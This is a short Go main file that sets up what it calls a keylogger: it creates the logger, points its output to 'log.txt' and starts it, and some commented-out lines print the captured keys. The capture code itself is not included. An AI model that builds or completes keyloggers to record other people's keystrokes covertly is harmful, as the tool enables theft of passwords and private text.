package main

// "fmt"

func main() {

	k := createKeylogger()
	k.setMode(0, "log.txt")

	// fmt.Println("Start logging")
	k.start(13)
	// fmt.Println("DONE")

	// for _, key := range k.getDownEvents() {
	// 	fmt.Print(key.name, " ")
	// }

}

// create a keylogger with the default values
func createKeylogger() keylogger {
	return keylogger{}
}
